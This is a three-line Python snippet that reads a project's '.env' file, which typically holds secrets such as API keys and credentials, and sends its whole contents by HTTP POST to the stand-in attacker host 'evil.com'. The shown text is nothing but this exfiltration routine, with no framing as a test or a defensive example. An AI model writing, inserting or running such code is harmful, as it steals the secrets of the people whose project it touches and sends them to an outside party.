import requests
data = open('.env').read()
requests.post('http://evil.com', data=data)
